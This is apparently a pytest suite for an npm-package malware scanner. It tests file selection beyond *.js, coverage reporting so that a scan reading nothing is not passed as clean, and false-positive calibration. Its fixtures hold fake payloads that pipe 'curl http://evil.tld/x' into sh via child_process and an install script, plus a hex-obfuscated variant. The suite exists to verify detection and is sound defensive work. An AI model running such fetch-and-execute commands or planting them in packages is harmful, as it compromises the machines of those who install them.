"""Tests for ``sandbox_codescan`` — Phase 5 file selection and coverage (F33).

The deep-code-analysis phase of ``sandbox <pkg>`` walked
``node_modules/<pkg>.rglob("*.js")``. Two bugs followed from that one line:

* **A payload in any other extension was invisible.** A ``.cjs`` / ``.mjs``
  entry point, shipped TypeScript, an extension-less ``bin/`` script or an
  ``install.sh`` invoked from a lifecycle hook were never read.
  :func:`test_old_js_glob_reads_none_of_the_real_entry_points` is the fail-first
  proof: it asserts the old glob selects **zero** of four files that each carry
  a real payload.
* **Reading nothing was reported as a pass.** Unlike an unreadable file (which
  F29 taught the phase to count), an empty selection printed
  "✓ No obvious malware patterns" and added an ``info`` finding, so a package
  could reach "APPEARS SAFE TO DOWNLOAD" on a phase that read no bytes at all.
  :class:`DeepCodeScanReport` now reports its own coverage and
  ``blind_reason()`` drives ``SandboxFindings.mark_blind``.

The last group pins the calibration the widening forced. Reading ``.mjs`` builds
exposed two corroboration signals that promote a capability to a DANGER on
mainstream benign packages: measured over 995 publishable installed packages,
the widened walk condemned ``pdfjs-dist`` and ``pdf-parse`` (and, already,
``sass``). Both were fixed at the source of the imprecision rather than by
deleting a detection:

* the hex-blob pattern now requires **printable-ASCII** escapes, so obfuscated
  text (``\\x63\\x75\\x72\\x6c`` = ``curl``) still matches while an embedded
  binary font table does not;
* ``screen capture`` left ``CONTEXT_DESCRIPTIONS``, because "spawns a process
  and mentions screenshots" is the shape of puppeteer, not of spyware.

:func:`test_https_client_still_corroborates_a_capability` and
:func:`test_hex_obfuscated_text_still_corroborates` guard that neither fix was
paid for with detection.
"""

import ast
from pathlib import Path

import pytest

import sandbox_codescan
from sandbox_check import classify_malware_hits
from sandbox_codescan import (
    EXECUTABLE_SCRIPT_DIRS,
    MAX_UNREADABLE_EXAMPLES,
    SCANNABLE_CODE_EXTENSIONS,
    DeepCodeScanReport,
    collect_scannable_files,
    describe_scanned_extensions,
    is_scannable_code_path,
    scan_installed_package_code,
)

# A payload that trips an ALWAYS-dangerous pattern, so a detection assertion is
# about coverage and not about the corroboration gate.
PAYLOAD = "require('child_process').execSync('curl http://evil.tld/x | sh')\n"


def write(root: Path, relative: str, content: str = "") -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def make_malicious_package(root: Path) -> Path:
    """A package whose every payload sits outside ``*.js``."""
    pkg = root / "node_modules" / "evil-pkg"
    write(pkg, "package.json", '{"name": "evil-pkg", "main": "lib/index.mjs"}')
    write(pkg, "postinstall.cjs", PAYLOAD)
    write(pkg, "lib/index.mjs", PAYLOAD)
    write(pkg, "bin/setup", "#!/usr/bin/env node\n" + PAYLOAD)
    write(pkg, "scripts/install.sh", "#!/bin/sh\ncurl http://evil.tld/x | sh\n")
    return pkg


def make_benign_package(root: Path) -> Path:
    """The shape of an ordinary dual-build package."""
    pkg = root / "node_modules" / "good-pkg"
    write(pkg, "package.json", '{"name": "good-pkg", "main": "dist/index.cjs"}')
    write(pkg, "README.md", "# good-pkg\n\nDoes a thing.\n")
    write(pkg, "LICENSE", "MIT\n")
    write(pkg, "dist/index.cjs", "module.exports = function add(a, b) { return a + b }\n")
    write(pkg, "dist/index.mjs", "export default function add(a, b) { return a + b }\n")
    write(pkg, "dist/index.d.ts", "export default function add(a: number, b: number): number;\n")
    write(pkg, "dist/index.cjs.map", '{"version":3,"sources":["../src/index.ts"]}')
    write(pkg, "src/index.ts", "export default function add(a: number, b: number) { return a + b }\n")
    write(pkg, "bin/good", "#!/usr/bin/env node\nrequire('../dist/index.cjs')\n")
    return pkg


# ---------------------------------------------------------------------------
# is_scannable_code_path — the selection rule
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("extension", sorted(SCANNABLE_CODE_EXTENSIONS))
def test_every_declared_extension_is_selected(extension):
    assert is_scannable_code_path(f"lib/index{extension}")


def test_js_is_still_selected():
    """The old glob's coverage is a strict subset of the new selection."""
    assert is_scannable_code_path("index.js")
    assert is_scannable_code_path("deep/nested/dir/thing.min.js")


@pytest.mark.parametrize(
    "relative",
    [
        "README.md",
        "LICENSE",
        "CHANGELOG",
        "package.json",
        "tsconfig.json",
        "dist/index.js.map",
        "prebuilds/linux-x64/node.napi.node",
        "dist/module.wasm",
        "assets/logo.png",
        "notes.js.txt",  # the extension is .txt, not .js
        "",
        "   ",
    ],
)
def test_non_code_is_not_selected(relative):
    assert not is_scannable_code_path(relative)


def test_json_is_deliberately_excluded():
    """Data, not code — and counting it would defeat the blind check.

    Every npm package ships a ``package.json``; if that counted as a scanned
    source file, no package could ever report "nothing scannable found" and the
    coverage half of this module would be dead code.
    """
    assert ".json" not in SCANNABLE_CODE_EXTENSIONS
    assert not is_scannable_code_path("package.json")


def test_extension_match_is_case_insensitive():
    assert is_scannable_code_path("Lib/INDEX.CJS")
    assert is_scannable_code_path("BIN/Tool.PS1")


def test_dotfile_without_an_extension_is_not_code():
    """A leading dot is the name, not an extension separator."""
    assert not is_scannable_code_path(".npmrc")
    assert not is_scannable_code_path(".gitignore")
    # ...but a dotfile that really does end in a code extension is code.
    assert is_scannable_code_path(".eslintrc.js")
    assert is_scannable_code_path("types/index.d.ts")


def test_extension_less_file_is_selected_only_inside_a_bin_directory():
    """npm's own convention for a package's command: ``"bin": "bin/cli"``."""
    assert is_scannable_code_path("bin/cli")
    assert is_scannable_code_path(".bin/tool")
    assert is_scannable_code_path("dist/bin/run")
    assert not is_scannable_code_path("lib/cli")
    assert not is_scannable_code_path("Makefile")


def test_bin_matching_is_by_segment_not_substring():
    """The discipline ``is_expected_install_path`` already enforces.

    A substring test would make every extension-less file under ``binaries/``
    or ``rebind/`` look like an executable.
    """
    assert not is_scannable_code_path("binaries/tool")
    assert not is_scannable_code_path("rebind/handler")
    assert not is_scannable_code_path("cabinet/file")


def test_backslash_paths_are_normalized():
    assert is_scannable_code_path(r"dist\index.mjs")
    assert is_scannable_code_path(r"bin\cli")


def test_declared_extensions_are_normalized():
    """Anti-drift: a stray "js" or ".JS" would silently never match."""
    for extension in SCANNABLE_CODE_EXTENSIONS:
        assert extension.startswith("."), extension
        assert extension == extension.lower(), extension
        assert extension.count(".") == 1, extension
    for directory in EXECUTABLE_SCRIPT_DIRS:
        assert directory == directory.lower(), directory


# ---------------------------------------------------------------------------
# The bug, proved fail-first
# ---------------------------------------------------------------------------


def test_old_js_glob_reads_none_of_the_real_entry_points(tmp_path):
    """Fail-first: the pre-F33 walk selected ZERO of four payload-bearing files."""
    pkg = make_malicious_package(tmp_path)

    assert list(pkg.rglob("*.js")) == []


def test_new_selection_reads_every_entry_point(tmp_path):
    pkg = make_malicious_package(tmp_path)

    selected = {
        path.relative_to(pkg).as_posix() for path in collect_scannable_files(pkg)[0]
    }

    assert selected == {
        "postinstall.cjs",
        "lib/index.mjs",
        "bin/setup",
        "scripts/install.sh",
    }


def test_payloads_outside_dot_js_are_detected(tmp_path):
    """The coverage fix, end to end: each file's payload reaches the report."""
    pkg = make_malicious_package(tmp_path)

    report = scan_installed_package_code(pkg)

    assert report.files_scanned == 4
    flagged = {path for path, _description in report.hits}
    assert flagged == {
        "postinstall.cjs",
        "lib/index.mjs",
        "bin/setup",
        "scripts/install.sh",
    }
    assert classify_malware_hits(report.hits).dangers


def test_collected_files_are_sorted(tmp_path):
    """Deterministic order, so a report does not depend on the filesystem."""
    pkg = make_malicious_package(tmp_path)

    files, _dir_errors = collect_scannable_files(pkg)

    assert files == sorted(files)


# ---------------------------------------------------------------------------
# Coverage reporting — a blind phase is never a pass
# ---------------------------------------------------------------------------


def test_package_with_no_scannable_file_is_blind_not_clean(tmp_path):
    """A native-binary package: nothing this text scan can read."""
    pkg = tmp_path / "node_modules" / "native-pkg"
    write(pkg, "package.json", '{"name": "native-pkg"}')
    write(pkg, "README.md", "# native-pkg\n")
    write(pkg, "prebuilds/win32-x64/node.napi.node", "\x00binary\x00")

    report = scan_installed_package_code(pkg)

    assert report.files_scanned == 0
    assert not report.scanned_anything
    assert report.hits == []
    reason = report.blind_reason("native-pkg")
    assert reason is not None
    assert "node_modules/native-pkg" in reason
    assert "NOT analyzed" in reason


def test_a_fully_read_package_is_not_blind(tmp_path):
    pkg = make_benign_package(tmp_path)

    report = scan_installed_package_code(pkg)

    assert report.scanned_anything
    assert report.coverage_complete
    assert report.blind_reason("good-pkg") is None


def test_unreadable_files_are_counted_not_scanned(tmp_path, monkeypatch):
    pkg = make_benign_package(tmp_path)

    def failing_read(path):
        if path.suffix == ".mjs":
            raise PermissionError(13, "Permission denied")
        return path.read_text(errors="ignore")

    monkeypatch.setattr(sandbox_codescan, "read_code_file", failing_read)

    report = scan_installed_package_code(pkg)

    assert report.files_unreadable == 1
    assert report.scanned_anything  # the rest still scanned
    assert not report.coverage_complete
    reason = report.blind_reason("good-pkg")
    assert reason is not None
    assert "unreadable" in reason
    assert "partial" in reason


def test_nothing_readable_says_not_analyzed_not_partial(tmp_path, monkeypatch):
    """"Partial" would overstate a phase that read nothing at all."""
    pkg = make_benign_package(tmp_path)
    monkeypatch.setattr(
        sandbox_codescan,
        "read_code_file",
        lambda path: (_ for _ in ()).throw(OSError(5, "I/O error")),
    )

    report = scan_installed_package_code(pkg)

    assert report.files_scanned == 0
    reason = report.blind_reason("good-pkg")
    assert "NOT analyzed" in reason
    assert "partial" not in reason


def test_unreadable_examples_are_capped(tmp_path, monkeypatch):
    pkg = tmp_path / "node_modules" / "many"
    for index in range(MAX_UNREADABLE_EXAMPLES + 4):
        write(pkg, f"lib/mod{index}.mjs", "export default 1\n")
    monkeypatch.setattr(
        sandbox_codescan,
        "read_code_file",
        lambda path: (_ for _ in ()).throw(OSError(5, "I/O error")),
    )

    report = scan_installed_package_code(pkg)

    assert report.files_unreadable == MAX_UNREADABLE_EXAMPLES + 4
    assert len(report.unreadable_examples) == MAX_UNREADABLE_EXAMPLES


def test_an_unlistable_directory_is_recorded_not_swallowed(tmp_path, monkeypatch):
    """A tree that half-failed must not read as a clean tree."""
    pkg = make_benign_package(tmp_path)
    real_walk = sandbox_codescan.os.walk

    def walk_with_error(top, onerror=None, **kwargs):
        if onerror is not None:
            onerror(PermissionError(13, "Permission denied"))
        yield from real_walk(top, onerror=onerror, **kwargs)

    monkeypatch.setattr(sandbox_codescan.os, "walk", walk_with_error)

    report = scan_installed_package_code(pkg)

    assert report.dir_errors == 1
    assert not report.coverage_complete
    reason = report.blind_reason("good-pkg")
    assert "directory(s) could not be listed" in reason


def test_blind_reason_without_a_package_name_is_still_readable():
    assert "the package" in DeepCodeScanReport().blind_reason()


# ---------------------------------------------------------------------------
# Benign baseline — zero false positives
# ---------------------------------------------------------------------------


def test_benign_package_produces_no_dangers(tmp_path):
    pkg = make_benign_package(tmp_path)

    report = scan_installed_package_code(pkg)

    assert report.scanned_anything
    assert classify_malware_hits(report.hits).dangers == []


def test_benign_package_scans_the_widened_set(tmp_path):
    """Zero FPs must come from having looked, not from having skipped."""
    pkg = make_benign_package(tmp_path)

    report = scan_installed_package_code(pkg)

    assert set(report.scanned_by_extension) == {".cjs", ".mjs", ".ts", ""}
    assert report.files_scanned == 5  # .cjs, .mjs, .d.ts, .ts, bin/good


def test_embedded_binary_is_not_obfuscation(tmp_path):
    """The FP that widening exposed: a renderer's binary tables + a runtime fn.

    ``pdfjs-dist`` / ``pdf-parse`` ship a ``pdf.worker.mjs`` carrying long
    ``\\xNN`` runs of font/CMap bytes and a ``new Function``; the unrestricted
    hex pattern read the data as obfuscation and made them DO NOT INSTALL.
    """
    pkg = tmp_path / "node_modules" / "pdf-ish"
    binary_table = "".join(f"\\x{byte:02x}" for byte in (0x00, 0x8A, 0xFF, 0x1B, 0x90, 0xC3, 0x02, 0xE1))
    write(
        pkg,
        "build/pdf.worker.mjs",
        f"const glyphs = '{binary_table}';\n"
        "const render = new Function('ctx', 'return ctx');\n",
    )

    report = scan_installed_package_code(pkg)
    descriptions = {description for _path, description in report.hits}

    assert "hex-encoded string blob (possible obfuscation)" not in descriptions
    assert classify_malware_hits(report.hits).dangers == []


def test_hex_obfuscated_text_still_corroborates(tmp_path):
    """Detection guard: readable text hidden as `\\xNN` is still obfuscation."""
    pkg = tmp_path / "node_modules" / "sneaky"
    write(
        pkg,
        "index.mjs",
        "import c from 'child_process';\n"
        "const s = '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a';\n"
        "c.exec(s);\n",
    )

    report = scan_installed_package_code(pkg)
    descriptions = {description for _path, description in report.hits}

    assert "hex-encoded string blob (possible obfuscation)" in descriptions
    assert classify_malware_hits(report.hits).dangers


def test_visual_test_shape_is_not_a_danger():
    """puppeteer / playwright / jest-image-snapshot: spawn + "screenshot"."""
    hits = [
        ("bin/cli.test.mjs", "screen capture"),
        ("bin/cli.test.mjs", "child_process - command execution"),
    ]

    report = classify_malware_hits(hits)

    assert report.dangers == []


def test_https_client_still_corroborates_a_capability():
    """Regression guard: the calibration narrowed the context set, not the rule."""
    hits = [
        ("lib/payload.mjs", "HTTPS client"),
        ("lib/payload.mjs", "child_process - command execution"),
    ]

    report = classify_malware_hits(hits)

    assert report.corroborated == ["child_process - command execution"]
    assert report.dangers


# ---------------------------------------------------------------------------
# Reporting helpers
# ---------------------------------------------------------------------------


def test_describe_scanned_extensions_orders_by_count():
    assert describe_scanned_extensions({".js": 2, ".mjs": 9}) == ".mjs x9, .js x2"


def test_describe_scanned_extensions_names_the_extension_less_case():
    assert describe_scanned_extensions({"": 1}) == "no extension x1"


def test_describe_scanned_extensions_handles_nothing():
    assert describe_scanned_extensions({}) == "nothing"


def test_describe_scanned_extensions_summarizes_overflow():
    counts = {".js": 5, ".mjs": 4, ".cjs": 3, ".ts": 2, ".sh": 1, ".py": 1}

    described = describe_scanned_extensions(counts, limit=3)

    assert described.endswith("+3 more")


# ---------------------------------------------------------------------------
# Mechanism guard: the module has to actually be wired into the phase
# ---------------------------------------------------------------------------

CLI_SOURCE = Path(__file__).resolve().parents[1] / "src" / "cli.py"


def test_cli_no_longer_globs_only_js():
    """The one line this task exists to remove."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")

    assert 'rglob("*.js")' not in source
    assert "rglob('*.js')" not in source


def test_cli_phase_five_uses_the_walk_and_can_mark_itself_blind():
    """A module nobody calls would leave the phase exactly as blind as before."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")
    ast.parse(source)  # the guard must not be satisfied by a syntax-broken file

    assert "from sandbox_codescan import" in source
    assert "scan_installed_package_code(node_modules)" in source
    assert "code_report.blind_reason(" in source
